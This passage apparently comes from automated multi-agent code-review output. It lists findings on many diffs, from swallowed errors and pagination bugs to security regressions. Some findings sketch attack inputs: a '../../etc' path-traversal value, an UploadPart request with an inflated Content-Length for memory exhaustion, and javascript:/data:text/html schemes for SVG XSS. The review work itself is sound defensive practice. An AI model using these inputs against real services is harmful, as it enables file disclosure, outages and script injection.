Lines 18-19 then declare a brand-new `var err error` (always nil) and return it, so `WriteSettlement` returns `nil` on every path where validation passes — including when the INSERT failed. Any caller that does `if err := WriteSettlement(...); err != nil` will treat a dropped settlement as a success, so the end-of-day batch will silently under-report and the row is lost with only a log line as evidence.

If the intent really is "log and continue", that decision belongs in the batch loop, not hidden behind an `error` return that can never be non-nil: return the error here (matching `WriteEntry` on lines 7-8, which propagates `err`) and let the caller decide to continue. If a nil return is deliberate, drop the `error` from the signature or `return nil` explicitly so the contract is honest.

findings.title: No test covers WriteSettlement's error-swallowing return path
findings.body: WriteSettlement logs a failed insert but then returns a freshly declared `err` (always nil) instead of propagating the Exec error. There is no test in this diff exercising WriteSettlement, so a future refactor that fixes or re-breaks this return value would not be caught by anything. Add a test that forces db.Exec to fail (e.g. via a mock/stub DB) and asserts the returned error, so the intended contract (does it return an error on insert failure, or is silent continuation intentional?) is pinned down.

findings.title: Mutable default `attempted=[]` accumulates across calls
findings.body:
`attempted=[]` is evaluated once at function definition time, so the same list object is reused on every call that omits the argument. Failures from call N are still present in the list returned by call N+1, so the return value is wrong for every invocation after the first, and the list grows without bound for the lifetime of the process. Use `attempted=None` and initialise inside the body (`attempted = [] if attempted is None else attempted`), matching the `dict(extra_headers or {})` idiom already used on line 2.

_Also raised by the security agent:_ Shared mutable default leaks recipients across calls and grows unbounded

_Also raised by the docs agent:_ Public function lacks documentation of its contract

findings.title: No test covers send_with_retries, including mutable-default bug
findings.body: send_with_retries introduces a mutable default argument (attempted=[]) which persists across calls, accumulating stale entries from previous invocations. No test in this diff exercises the function at all, let alone calling it twice to reveal the shared-list bug. A test calling send_with_retries twice with different recipients and asserting the returned list only contains recipients from the current call would catch this.

findings.title: Rounding threshold silently changed from >= 0.5 to > 0.5
findings.body:
This PR is described as a pure rename, but `compute_rounding` also changes the comparison: the old `calc_rounding` returned 1 when `line.remainder_cents >= 0.5`, the new one only when `> 0.5`. A line with a remainder of exactly 0.5 cents now rounds down instead of up, which is precisely the half-cent case rounding rules exist to decide — and the most common remainder value for amounts split evenly in two. Over a batch this shifts totals by whole cents and can break reconciliation against previously computed invoices. If the change is intentional it belongs in its own commit with a test pinning the 0.5 boundary; otherwise restore `>=`.

_Also raised by the tests agent:_ Rounding boundary condition changed from >= to > with no test to catch it

findings.title: Off-by-one slice in page_of_sorted drops one record per page
findings.body:
`start` advances by `PAGE_SIZE` per page (line 11), but the slice ends at `start + PAGE_SIZE - 1` (line 12), so each page yields only `PAGE_SIZE - 1` items. The record at index `start + PAGE_SIZE - 1` is never returned by page `n` and is skipped by page `n+1`, which begins at `start + PAGE_SIZE`. For an export endpoint this means one record is silently lost per page — the exact failure mode a paginated export must not have. It also diverges from the sibling `page_of` on line 6, which correctly uses `start + PAGE_SIZE`. Change the slice to `ordered[start : start + PAGE_SIZE]`.

_Also raised by the docs agent:_ page_of_sorted returns fewer items than page_of

findings.title: page_of_sorted has no test covering page boundaries
findings.body: The new page_of_sorted function changes pagination behavior (adds sorting and a differently-sized slice: `start + PAGE_SIZE - 1` vs the existing `start + PAGE_SIZE` in page_of). No test exercises this function, so a boundary defect (e.g. one fewer record per page than intended, or incorrect ordering across page boundaries) would go undetected. Add a test asserting the exact set/count of records returned for at least two pages, including the last page, against a known input.

findings.title: Removed None guard makes header_lines crash for most invoices
findings.body: `Invoice.purchase_order` is annotated `str | None` and documented as set for only about one account in twenty. The removed `if invoice.purchase_order is not None:` guard was not redundant — with it gone, `invoice.purchase_order.upper()` raises `AttributeError: 'NoneType' object has no attribute 'upper'` for the ~95% of invoices with no purchase order. Restore the conditional append (or use a fallback such as `(invoice.purchase_order or "").upper()` only if an empty PO line is genuinely wanted).

findings.title: Code contradicts documented optional field contract
findings.body: The function now calls `.upper()` on `invoice.purchase_order` without checking if it is None. However, the `Invoice` model explicitly documents that `purchase_order` is optional ("only set for customers on invoicing terms, which is roughly one account in twenty"). A caller relying on the documented contract would pass an Invoice with `purchase_order=None` and the function will crash. Either document that the field is required here, or restore the None check.

findings.title: No test guards against purchase_order being None
findings.body: The removed nil check handled the documented case where `Invoice.purchase_order` is `None` (per models/invoice.py docstring, true for ~1 in 20 accounts). The new code calls `.upper()` unconditionally on `invoice.purchase_order`, which will raise AttributeError when it's None. No test in this diff exercises `header_lines` with `purchase_order=None`, so this regression would not be caught by CI.

findings.title: File handle leaks on early return and on exception paths
findings.body:
`fh = open(path)` on line 10 is only closed on line 16, the success path. When the header does not match, line 14 returns `None` with the handle still open; likewise any exception from `next(reader)` (line 12) or `list(reader)` (line 15) escapes before the close. Since validation failure is the explicitly intended behaviour of this function, the leak happens on a routine input, not a rare one — importing a directory of partner files with bad headers will exhaust file descriptors. Wrap the body in `with open(path) as fh:` as `read_rows` on line 5 already does, and drop the manual `fh.close()`.

_Also raised by the security agent:_ File handle leaks on header-mismatch path (repeatable by uploader)

findings.title: No test coverage for read_validated, including leak-prone early return
findings.body: read_validated is new logic with a branch (header mismatch vs match) and a resource-management bug: when header != expected_header, the function returns None on line 14 without closing fh, leaking the file handle. There is no test file in this diff, so neither the happy path, the mismatched-header path, nor the file-handle leak would be caught by any test run.

findings.title: Retry wraps non-idempotent charge() with no idempotency key
findings.body:
`charge()` is documented in `billing/gateway.py` as "NOT idempotent: each call creates a new charge." Wrapping it in `@retry(attempts=3)` means any failure that occurs *after* the gateway has accepted the POST (network timeout, dropped connection, 5xx on a request that was actually processed) will be retried, producing up to three real charges against the customer's card for a single logical call. The retry cannot distinguish "request never arrived" from "response never came back".

The gateway docstring already names the fix: "The gateway supports an Idempotency-Key header; pass one to make retries safe." Either generate a stable idempotency key per logical charge and pass it through to `charge()` before retrying, or drop the retry from this path and let the caller decide. `fetch_charge` on line 6 is fine — `get_charge` is documented as safe to repeat — so the retry decorator itself is not the problem, only its application to the write path.

_Also raised by the security agent:_ Retry on non-idempotent charge without Idempotency-Key allows duplicate charges

findings.title: Wrapped non-idempotent call lacks idempotency guidance
findings.body: The `charge_card` function wraps `charge()` with retry logic, but `charge()` is explicitly non-idempotent (documented in gateway.py as creating a new charge on each call). The wrapper must document that callers are responsible for passing an Idempotency-Key header to the gateway, or the retries will result in duplicate charges. Without this documentation, callers may assume the wrapper is safe to retry and lose money.

findings.title: Retrying a non-idempotent charge call is untested
findings.body: charge_card wraps billing.gateway.charge with @retry(attempts=3), but gateway.charge is explicitly documented as NOT idempotent (each call creates a new charge) and only safe to retry if an Idempotency-Key is passed — which this wrapper does not do. There is no test exercising charge_card's retry behavior (e.g. simulating a transient failure after the underlying charge succeeded) that would catch a duplicate-charge scenario. As written, any test suite would pass even though a flaky success followed by a retry could double-bill a customer.

findings.title: Naive datetime.now() subtracted from tz-aware expires_at raises TypeError
findings.body:
`cutoff` is created with `datetime.now()` (no tzinfo), but `Invite.expires_at` is documented as always timezone-aware UTC. Subtracting a naive datetime from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, so `expires_within` fails for every invite, not just an edge case. Use `datetime.now(timezone.utc)` as `is_expired` on line 5 already does. Note also that `datetime.now()` returns local wall-clock time, so even if both sides were naive the comparison would be offset by the machine's UTC offset.

_Also raised by the security agent:_ Invite expiry window computed from naive local time

findings.title: Timezone-aware comparison with timezone-naive datetime
findings.body: The function `expires_within` creates a timezone-naive `cutoff` using `datetime.now()` at line 9, then subtracts it from `invite.expires_at`, which the `Invite` class documents as always being timezone-aware UTC. This violates the established contract and will behave incorrectly if the comparison happens near a DST transition or in non-UTC timezones. The fix is to use `datetime.now(timezone.utc)` to match the pattern in `is_expired` (line 5) and the documented invariant.

findings.title: No test exercises expires_within, which mixes naive/aware datetimes
findings.body: expires_within subtracts invite.expires_at (tz-aware, per models/invite.py docstring) from cutoff (datetime.now(), naive), which raises TypeError at runtime. There is no test file in this diff, and no existing test appears to cover this new function, so this defect would ship undetected.

findings.title: contactEmail dereferences optional billingContact without a guard
findings.body: `Account.billingContact` is declared optional (`billingContact?`) and the type comment says it is "Absent until the customer completes onboarding." `contactEmail` reads `account.billingContact.email` directly, so for any account that has not completed onboarding this throws `TypeError: Cannot read properties of undefined (reading 'email')`. Under `strictNullChecks` this should also fail to compile. The sibling function on line 4 already handles the same field correctly with `?.` plus a fallback. Mirror that, e.g. `return account.billingContact?.email.toLowerCase() ?? "";` — or, if callers genuinely require an email, change the signature to return `string | undefined` so the absence is visible at the call site rather than crashing at runtime.

findings.title: Undocumented precondition: billingContact must be present
findings.body: The function `contactEmail` accesses `account.billingContact.email` without null-checking, but the Account interface defines `billingContact` as optional with the note 'Absent until the customer completes onboarding'. A caller cannot determine from the function signature alone whether they must first check that `billingContact` exists, and using this function on an account that has not completed onboarding will throw at runtime. Add a docstring documenting that `billingContact` must be present, or guard the access.

findings.title: No test exercises contactEmail with missing billingContact
findings.body: contactEmail accesses account.billingContact.email without the optional chaining used in bannerFor just above it, despite billingContact being typed optional (per types.ts). There is no test in this diff (or apparent elsewhere) that calls contactEmail with an account lacking billingContact, so a null-deref bug here would not be caught by any existing test.

findings.title: timeout=30 is 30 milliseconds, not 30 seconds
findings.body: `fetch()` documents `timeout` as MILLISECONDS ("Callers wanting seconds must multiply"). Passing `timeout=30` gives the partner API a 30 ms budget, which will almost certainly time out against a slow remote endpoint — the opposite of the "generous" timeout the PR describes. Since `retries` defaults to 3 and the docstring says retries share the same budget, the whole call will fail fast every night and the failure will surface as an unhandled exception (or an empty catalogue) rather than a slow-but-successful sync. Pass `timeout=30_000` (or `30 * 1000` with a comment) to get 30 seconds.

findings.title: Timeout parameter misinterprets millisecond contract
findings.body: The `fetch()` function's docstring (in clients/http.py) states that timeout is in MILLISECONDS. The call on line 9 passes `timeout=30`, which would be 30 milliseconds—far too short for a slow API. The PR description says the timeout is 'set generously', indicating the author intended 30 seconds. To match the documented contract, this should be `timeout=30000` to specify 30,000 milliseconds.

findings.title: No test covers sync_partner_catalogue's behavior or timeout value
findings.body: sync_partner_catalogue() is new and calls fetch(url, timeout=30). Per clients/http.py, `timeout` is in milliseconds, so 30 likely means 30ms rather than the intended 30 seconds — but nothing in this diff exercises this function, so a wrong timeout, a wrong URL, or a completely broken call would still pass CI silently.

findings.title: Duplicate index: identical to invoices_tenant_created_idx from 0007
findings.body: `invoices_tenant_recent_idx` is defined on `invoices (tenant_id, created_at DESC)` — byte-for-byte the same table, column order and sort direction as `invoices_tenant_created_idx`, which migration 0007 already applied on 2025-11-02. `IF NOT EXISTS` matches on index *name*, not on definition, so it will not prevent this from being built: Postgres will happily create a second, redundant B-tree. The cost is duplicated storage plus an extra index to maintain on every INSERT/UPDATE/DELETE of `invoices`, on what is presumably a high-write table, with zero read benefit because the planner already has an identical structure available. Drop this statement; the reporting query the PR describes (filter by tenant, sort by recency) is already served by the 0007 index.

findings.title: Referer header now logged unscrubbed, leaking the auth token
findings.body:
The removed branch specifically special-cased `Referer` and passed it through `_scrub_uri(value, extra_param_keys)` before storing it. The replacement copies `request.headers[header]` for every header in the list, including `Referer`, with no scrubbing. Per `jupyter_server/auth/identity.py`, notebook URLs are handed out as `{base}?token={token}`, so the browser sends that token in the `Referer` header on every subresource request. Any 5xx now serialises the full token into the log via `json.dumps(headers, indent=2)`, where anyone with log read access (or a shipped log aggregator) obtains a working credential. Restore the `Referer`-specific `_scrub_uri` call, or scrub the whole value set uniformly. Note also that `extra_param_keys` is now likely unused in this function, which is a good signal the sanitisation path was dropped wholesale rather than moved.

_Also raised by the security agent:_ Auth token leaked into logs: Referer no longer scrubbed

findings.title: No test guards against logging unscrubbed Referer tokens
findings.body: The change deletes the call to _scrub_uri for the Referer header, so the full referer URL (which per the identity.py docstring carries the auth token as a query parameter) is now logged verbatim. Nothing in this diff exercises this code path with a Referer containing a token to confirm it is/was scrubbed, so a regression here — reintroducing or removing the scrub — would not be caught by any existing or new test. Add a test that sets a Referer header containing a token query param, triggers the 5xx logging path, and asserts the logged output does not contain the raw token value.

findings.title: xlink:href no longer scheme-checked, enabling stored XSS via SVG
findings.body: `validateProp` previously routed `href`, `src` and `xlinkhref` through `isAnchorLinkAllowed(value)`, which rejects the `unsafeLinkPrefix` schemes (`javascript:`, `data:text/html`, `vbscript:`). After this change `xlinkhref` falls through that branch and is validated by whatever generic path follows, so a value like `` in user-submitted markdown is emitted as-is. `xlink:href` is a live script-URL sink in SVG in browsers that still honour it, and is also used by `` for external document references. This is not a rarely-used cosmetic attribute — it is one of the three URL-bearing attributes the sanitiser knows about. Restore `attribute === 'xlinkhref'` in the condition (and consider also normalising `xlink:href`/`xlinkHref` spellings to the same branch) rather than removing it. _Also raised by the correctness agent:_ xlink:href no longer scheme-validated, re-enabling javascript: XSS

findings.title: No test guards xlinkhref sanitisation behavior change
findings.body: The diff removes 'xlinkhref' from the set of attributes routed through isAnchorLinkAllowed, meaning xlink:href values (e.g. on SVG <a> or <use> elements) will no longer be validated against unsafeLinkPrefix. No test file is part of this change, so nothing would fail if this removal reintroduces an XSS vector via javascript:/data:text/html/vbscript: URIs in an xlinkhref attribute, or if it was in fact safe to remove and the removal breaks legitimate xlink:href rendering.

findings.title: Removing ValidateID lets unvalidated project names reach buildPath
findings.body:
`projectQueryParameter` comes straight from the request query string. With the `common.ValidateID` check deleted, the only remaining guard on this branch is the equality comparison against `parameters.Project` on line 4, which is skipped entirely when the path parameter is empty. The value therefore reaches the file DAO unvalidated.

The retrieved `buildPath` documents its contract explicitly: "It does no validation of its own: callers are required to have validated the names before this point." `filepath.Join` does not scope a path under its first argument — it lexically cleans the result, so `filepath.Join(d.Folder, "../../etc", kind)` resolves *above* `d.Folder`. The PR description's premise that "the path join already scopes under the folder root" is incorrect.

Restore the `common.ValidateID(projectQueryParameter)` check (or perform an equivalent identifier check before any call that forwards this value to the DAO).

_Also raised by the security agent:_ Removing ValidateID lets the project query param traverse outside the folder root

findings.title: Validation removal violates documented caller contract
findings.body: The diff removes the ValidateID check on projectQueryParameter, but the buildPath function in file.go explicitly documents that 'callers are required to have validated the names before this point.' This change makes the caller (list.go) no longer uphold that documented requirement. If buildPath's documentation is accurate, this removal violates its contract. If the validation is truly unnecessary, the buildPath documentation should be updated to reflect that.

findings.title: Removed project-name validation has no test guarding the path-traversal risk
findings.body: The removal of common.ValidateID(projectQueryParameter) means arbitrary strings (e.g. containing '../') can now flow through to buildPath, which explicitly documents that it does no validation and relies on callers having validated names. There is no test in this diff exercising list() with a malicious or malformed projectQueryParameter (e.g. containing path separators) to confirm the behavior is still safe or to catch a regression if validation is mistakenly reinstated incorrectly elsewhere. If this change is wrong, nothing in the current test suite would fail.

findings.title: Buffer pre-reserved from client-controlled Content-Length (alloc DoS)
findings.body:
`multipart.NewRW().Reserve(contentLength)` sizes the buffer from `contentLength`, which for an S3 `UploadPart` request is derived from the request's `Content-Length` header — a value the client chooses and which is not verified against the bytes actually delivered until the later `io.Copy`. A client can send `PUT /bucket/key?partNumber=1&uploadId=...` with `Content-Length: 5368709120` and then send no body (or abort the connection); the reservation happens before a single byte is read, so the process commits the memory up front. Repeating this across concurrent connections exhausts RAM and OOM-kills the server, with no upload bandwidth cost to the attacker. Previously the RW grew page-by-page as data actually arrived, so memory consumption was bounded by bytes genuinely transferred — the removed comment on the deleted line says exactly that.

Fixes to consider: clamp the reservation to a sane cap (e.g. `min(contentLength, maxPartBuffer)`) and let the RW grow beyond that only as real bytes arrive; reject parts whose declared length exceeds the S3 5 GiB part limit before allocating; and guard the `contentLength < 0` case (chunked / unknown length), where `Reserve` receives a negative size with unclear behaviour.

_Also raised by the correctness agent:_ Buffer reserved from unvalidated client-declared Content-Length

_Also raised by the correctness agent:_ Reserve is called with a possibly negative contentLength

findings.title: No test exercises the new Reserve(contentLength) pre-allocation
findings.body: The change adds `rw.Reserve(contentLength)` to pre-size the multipart buffer from the declared Content-Length, but no test file is included in this diff. If Reserve() were removed, mis-implemented, or given a wrong/attacker-controlled value (e.g. via a bogus Content-Length header), nothing in the existing suite would fail — the io.Copy/MD5 logic below still produces the same output whether or not pre-reservation happened. Since this is the exact behavior the PR intends to fix (declared-length allocation), a test verifying that the buffer is sized appropriately (or that oversized/negative Content-Length values are handled safely) would catch regressions or reintroduce the original CVE-motivating issue.

findings.title: Default S3 scheme flips from https to http when is_secure is unset
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` yields `https` for every input except an explicit `False` — including the common case where `is_secure` is not present in `request.meta` at all (`.get` returns `None`). The new expression `"https" if request.meta.get("is_secure") else "http"` yields `http` for `None`, so every request that does not explicitly set `is_secure=True` is now built as `http://<bucket>.s3.amazonaws.com/...` on line 6 and sent in plaintext together with the AWS signature/Authorization header.

This is a behavioural default change that existing callers (which simply never set `request.meta["is_secure"]`) still rely on. If the intent really was just to simplify, preserve the default explicitly, e.g. `scheme = "http" if request.meta.get("is_secure", True) is False else "https"` or `scheme = "http" if request.meta.get("is_secure") is False else "https"` (unchanged).

Secondary, smaller difference: the new form also treats falsy-but-not-False values (`0`, `""`) as insecure, whereas the old form only special-cased the `False` singleton.

_Also raised by the docs agent:_ Inverted logic: scheme now defaults to http instead of https

findings.title: S3 downloads default to plaintext HTTP after ternary inversion
findings.body:
The old expression `"http" if request.meta.get("is_secure") is False else "https"` is secure-by-default: the only way to get plaintext is to explicitly set `is_secure=False`. The new expression `"https" if request.meta.get("is_secure") else "http"` is insecure-by-default: when `is_secure` is absent (the common case, since `.get()` returns `None`), the branch falls through to `http`. These are not equivalent — they differ for every unset/`None` value.

The resulting scheme is interpolated straight into the request URL on line 6, so S3 requests — which carry AWS SigV4 `Authorization` headers and/or presigned query parameters, plus the object body — go out over an unencrypted channel. A network-position attacker (shared Wi-Fi, hostile transit, a compromised egress proxy) can read the credential material and object contents, and can tamper with the response body that Scrapy then parses.

Restore the secure default, e.g. `scheme = "http" if request.meta.get("is_secure") is False else "https"`, or make the default explicit: `request.meta.get("is_secure", True)`.

findings.title: No test covers default-scheme behavior change for S3 requests
findings.body: The old logic defaulted to https unless is_secure was explicitly False; the new logic defaults to http unless is_secure is truthy. This changes behavior for the common case where 'is_secure' is absent from request.meta (now producing plaintext http instead of https). No test file is part of this diff, so nothing would fail if this scheme-selection logic were wrong in either direction.

findings.title: DELETE now authorizes as "push", erasing the delete permission
findings.body:
Previously `http.MethodDelete` mapped to `action = "delete"`. After the collapse, any method that is not GET/HEAD — including DELETE — yields `action = "push"`. The authorizer will therefore grant deletion to any principal holding only push rights, and conversely a principal granted `delete` but not `push` will be denied. The retrieved config documentation states the three actions are distinct precisely so that "an account may be allowed to push new tags without being allowed to delete existing ones"; this change removes that separation entirely and makes the `delete` grant unreachable. Restore an explicit `case http.MethodDelete: action = "delete"` (or an equivalent branch) before the push fallback.

_Also raised by the security agent:_ DELETE now authorises as "push", bypassing the delete permission

findings.title: DELETE requests now silently mapped to 'push', not exercised by tests in this diff
findings.body: The change collapses HTTP method-to-action mapping so that DELETE requests, which previously mapped to a distinct 'delete' action, now map to 'push'. Per the repository's own documentation (pkg/api/config/config.go), the three actions are 'distinct on purpose' so that an account can push without being able to delete. This diff includes no test file, so there is nothing shown here that would fail if a caller with only push permission is now able to perform delete operations.

findings.title: Unknown methods (e.g. OPTIONS) now require push instead of pull
findings.body: The old `default:` arm mapped any other method — OPTIONS, TRACE, CORS preflight — to `"pull"`. The new negative condition sends all of them to `"push"`. Clients with pull-only credentials that issue OPTIONS (browser preflight, health probes) will now be rejected. If the tightening is intentional it should be stated; otherwise keep the explicit method list so unmatched methods still fall back to `"pull"`.

findings.title: Cache eviction clears the entry just written, wiping all tenants
findings.body:
On the call that crosses the 1000-entry threshold, `_CACHE[tenant_id] = tenant` is immediately undone by `_CACHE.clear()`. The function still returns `tenant`, so the caller sees a correct value, but the cache write it was asked to perform did not happen — and every other cached tenant is discarded at the same time, so the next wave of `get_tenant` calls all miss. If callers use `get_tenant_fresh` specifically to warm the shared cache, that contract is broken exactly when the cache is most loaded.

Prefer a bounded eviction that removes a single entry (or a small batch) and preserves the entry just fetched, e.g. an LRU (`collections.OrderedDict` with `popitem(last=False)` or `functools.lru_cache`-style structure), or at minimum perform the size check and eviction *before* inserting the new value.

_Also raised by the security agent:_ Unbounded key insertion with full-cache-clear eviction enables cache flushing

findings.title: No test for get_tenant_fresh's fetch/cache/eviction behaviour
findings.body: get_tenant_fresh fetches a tenant, writes it into the shared _CACHE, and clears the entire cache once it exceeds 1000 entries. None of this is covered by a test in the diff: a bug where the tenant isn't cached, where the eviction threshold is off, or where clear() wipes unrelated entries prematurely would not be caught.

findings.title: Documentation references renamed flag --workers
findings.body:
The README documents `--workers` as the flag to control worker processes, but cli.py has renamed this flag to `--concurrency`. Users following the README will use the wrong flag name and encounter an error. Update line 7 to reference `--concurrency` instead.

_Also raised by the correctness agent:_ README still documents --workers after the flag was renamed

findings.title: Renaming --workers changes argparse dest and breaks existing callers
findings.body: `add_argument("--concurrency", ...)` makes argparse store the value under `args.concurrency`; every existing site that reads `args.workers`, and every script or CI job that passes `--workers N`, now fails (AttributeError, or argparse exiting with "unrecognized arguments"). If the intent was purely cosmetic alignment with an internal name, keep the old spelling working: `p.add_argument("--concurrency", "--workers", dest="concurrency", type=int, default=4)`, or at minimum grep for `args.workers` / `.workers` consumers and update them in this same change.

findings.title: No test verifies the renamed --concurrency flag
findings.body: The flag was renamed from --workers to --concurrency but no test exercises parser() to confirm --concurrency is accepted (and --workers is no longer, or a deprecation path exists). If the rename were incomplete or typoed, nothing in this change would fail.

findings.title: Docstring does not match new return type
findings.body: The function `monthly_usage()` now returns a dictionary of daily counts, not a single integer total. The docstring claims it returns 'the total number of API calls this month as an integer', but the implementation on lines 3–4 returns a dictionary with day keys and count values. This will mislead any caller who reads the docstring and expects an integer.

findings.title: Return type changed from int to dict; callers and docstring unchanged
findings.body:
`monthly_usage` previously returned a single integer (`_db.scalar(...)`) and now returns a `{day: count}` mapping. Any existing caller that does arithmetic, comparison, or formatting on the result (e.g. `monthly_usage(acct) > limit`, `f"{monthly_usage(acct)} calls"`) will now silently compare or render a dict instead of failing loudly at the call site. The docstring on line 2 still promises "the total number of API calls this month as an integer", so nothing in the module signals the change.

Either keep the total available (return both, or add a separate `daily_usage` function and leave `monthly_usage` returning the scalar), or update every caller and the docstring together. No callers were retrieved for this review, so please confirm the call sites before merging.

findings.title: No test covers new per-day breakdown return shape
findings.body: monthly_usage's contract changed from returning a single integer total to a dict mapping day -> count. No test file is included in this diff, so any consumer relying on the old integer contract, or a bug in the new grouping/aggregation logic, would not be caught. Add a test asserting the returned structure (e.g. {'2024-01-01': 3, ...}) for a known set of rows.

findings.title: Renaming page_size to limit breaks keyword callers
findings.body: `list_invoices` previously accepted `page_size` as its second parameter; it now accepts `limit`. Any existing caller invoking `list_invoices(tenant_id, page_size=100)` will now raise `TypeError: list_invoices() got an unexpected keyword argument 'page_size'`. Positional callers are unaffected. If this is a public/shared entry point, either keep a deprecated `page_size=None` alias that maps onto `limit`, or update every call site in the same change. No caller context was retrieved here, so please confirm the blast radius before merging.

findings.title: Docstring still documents the removed page_size parameter
findings.body:
The Args block still lists `page_size`, which no longer exists in the signature. Callers reading the docstring will pass `page_size=` and hit a `TypeError`. Update the entry to `limit`.

_Also raised by the docs agent:_ Docstring documents renamed parameter by old name

findings.title: Absolute import `from adapters import HTTPAdapter` will fail
findings.body: `adapters` is a sibling module inside the `requests` package, not a top-level module. Under Python 3 (and Python 2 with `absolute_import`) this raises `ImportError` at import time of `requests.sessions`, i.e. `import requests` breaks entirely. Every other import in this block is relative (`from .utils import ...`, `from .packages.urllib3.poolmanager import PoolManager`). Change to `from .adapters import HTTPAdapter`.

findings.title: verify/cert silently dropped — TLS settings never reach the adapter
findings.body:
The new `request()` signature still accepts `verify` and `cert` (lines 148-149), but the body only copies `method, url, headers, files, data, params, auth, cookies, allow_redirects, proxies, hooks` onto the `Request` before calling `req.prepare()` and `self.send(prep)`. `verify` and `cert` are never assigned to `req`, never stored on the session, and `send()` (line 365) constructs a bare `HTTPAdapter()` with no arguments and calls `adapter.send(request)` with nothing else.

Consequence: a caller who passes `verify='/etc/ssl/corp-ca.pem'` (or `verify=True` against a session whose config disables it, or a client `cert=(...)` for mutual TLS) gets the adapter's built-in default instead, with no error. Certificate/hostname verification and client-certificate authentication become whatever the unseen adapter default is, and the caller has no way to tell. That is a transport-security control that the caller asked for and that is no longer applied — an on-path attacker could present any certificate if the adapter default is permissive, and mTLS-protected endpoints will fail open or fail closed unpredictably.

Fix: thread `verify` and `cert` onto the prepared request (or onto the adapter/`send()` call) before this replaces `old_request`, and add a test that a bogus CA bundle causes a verification failure.

Caveat: `adapters.py` is not in this diff or in the retrieved context, so I cannot confirm the adapter's default for `verify`; the certain part is that the caller's explicit value is discarded.

findings.title: `old_request` still calls the deleted `_send_request`
findings.body: `_send_request` was removed in this diff, but the retained `old_request` body still ends with `return self._send_request(r, **args)`. Any call that reaches this path raises `AttributeError: 'Session' object has no attribute '_send_request'`. Either keep `_send_request` until `old_request` is deleted, or delete `old_request` in the same change.

findings.title: `request()` accepts but silently ignores timeout, verify, cert, prefetch, config
findings.body: The new `request()` keeps the full public signature but only forwards `method`, `url`, `headers`, `files`, `data`, `params`, `auth`, `cookies`, `allow_redirects`, `proxies` and `hooks`. `timeout`, `verify`, `cert`, `prefetch`, `config` and `return_response` are bound and dropped on the floor. Existing callers (`requests.api.get/post/...`, user code, `Session.get` and friends below which pass `**kwargs` straight through) will believe they set a timeout or disabled/enabled TLS verification and get neither: a request with `verify=False` and a request with a CA bundle now behave identically, and `timeout=` requests can hang forever. Either thread these onto the prepared request/adapter or raise `NotImplementedError` while the refactor is in flight rather than failing open.

findings.title: A fresh HTTPAdapter per send defeats pooling and leaks connections
findings.body: `send()` instantiates a new `HTTPAdapter()` on every call, so each request builds its own PoolManager/connection pool that is never referenced again and never cleared — connection reuse (the entire point of `Session`) is gone and sockets accumulate until GC. Combined with `close()` now being `pass` (line 132) and `__exit__` calling it, `with requests.Session() as s:` no longer releases anything. Hold a single adapter on the Session (e.g. in `__init__`) and have `close()` clear it.

findings.title: `self.poolmanager` and `init_poolmanager()` removed while still referenced
findings.body: `__init__` no longer calls `init_poolmanager()` and the method is gone, so `Session.poolmanager` no longer exists. Two consequences: (a) the legacy path kept in `old_request` ends in `Request.send()`, which in this codebase reaches the session's pool manager — that will now raise `AttributeError`; (b) `init_poolmanager()` is a documented subclassing hook (the standard way users configure pool size / SSL adapters), so removing it breaks third-party subclasses silently. Also note `PoolManager` is still imported on line 19 but no longer used. If the intent is to move ownership to the adapter, keep a compatibility shim or delete `old_request` in the same change.

findings.title: New request()->send()->HTTPAdapter path has no test coverage
findings.body: Session.request() was rewritten to build a Request/PreparedRequest and hand off to self.send(), which now instantiates an HTTPAdapter and calls adapter.send(request) instead of request.send(). This is the core send path for every HTTP call the library makes, and no test in this diff exercises it. If HTTPAdapter.send() returns the wrong object, drops kwargs (timeout, verify, cert, proxies are computed in old_request but not passed into the new prepare()/send() flow), or Session.send() breaks for any reason, nothing here would fail — the change would ship silently broken.

findings.title: Stale docstring: close() no longer clears pooled connections
findings.body: The `close()` method's docstring on lines 131-136 (before deletion) documented that it "closes the PoolManager, which closes pooled connections." However, the refactored implementation on line 132 now contains only `pass`, meaning the method does nothing. This stale documentation will mislead callers into believing their pooled connections are being cleaned up when they are not. Either update the docstring to reflect the no-op behavior, or restore the connection cleanup logic.

findings.title: close() now does nothing, with no test asserting resource cleanup
findings.body: close() previously cleared the poolmanager; it is now a bare pass since Session no longer owns the PoolManager. There is no test verifying that resources are still released after this refactor (e.g. via the new adapter), so a leaked connection pool from this change would go unnoticed.

findings.title: Public method `send()` docstring is incomplete
findings.body: The `send()` method on lines 363-367 is public and has a very brief docstring ("Send a given PreparedRequest.") that does not explain its contract or return value. Given that the refactor is moving request-sending onto HTTPAdapter (as mentioned in the PR description), callers need to understand what this method does and what it returns. Consider documenting the return type and any side effects.

findings.title: cookies returns None on parse failure, breaking every caller
findings.body:
The old implementation always returned a `Cookie.SimpleCookie` instance: on a parse error it called `self.clear_all_cookies()`, which iterated the (partially populated) `_cookies` and left it a dict-like object. The new code assigns `self._cookies = None` and returns it, so a single malformed `Cookie:` header — which is entirely attacker/client controlled — turns every downstream access into an exception: `name in self.request.cookies` (web.py:321) raises `TypeError: argument of type 'NoneType' is not iterable`, and `self.request.cookies.iterkeys()` (web.py:367) raises `AttributeError: 'NoneType' object has no attribute 'iterkeys'`. Because `_cookies` is cached, the failure persists for the whole request. Reset to a fresh `Cookie.SimpleCookie()` in the `except` branch instead of `None` so the return shape is invariant.

_Also raised by the security agent:_ Malformed Cookie header makes request.cookies None, raising on every reader

findings.title: RequestHandler.cookies removed with no forwarding alias
findings.body: `RequestHandler.cookies` was a documented public property; the diff deletes it and updates only the two in-file uses. Any other code in the framework (e.g. auth/websocket mixins) or in downstream applications that reads `self.cookies` inside a handler now raises `AttributeError`. Keeping a one-line forwarding property (`return self.request.cookies`) preserves the existing contract while still moving the implementation to `HTTPRequest`.

findings.title: No test covers the changed cookie-parse-failure behavior
findings.body: The exception handler for cookie parsing used to call self.clear_all_cookies() (in web.py) and now sets self._cookies = None (httpserver.py, lines 522-523). Downstream, get_cookie does `if name in self.request.cookies` (web.py line 321) and clear_all_cookies does `self.request.cookies.iterkeys()` (web.py line 367) — both would raise if cookies is None. There is no test exercising a malformed Cookie header, so this behavior change (and the potential crash it introduces) would pass unnoticed.

findings.title: HTTPRequest.cookies docstring omits error handling
findings.body:
The docstring states the property returns 'A dictionary of Cookie.Morsel objects' but does not document that it may return None when cookie parsing fails. A caller reading only the docstring would expect a dict-like object and could crash when trying to iterate or check membership.

Update the docstring to document the None case: 'A dictionary of Cookie.Morsel objects, or None if the Cookie header is malformed.'

findings.title: Parameter names not stripped: `boundary` never matches real headers
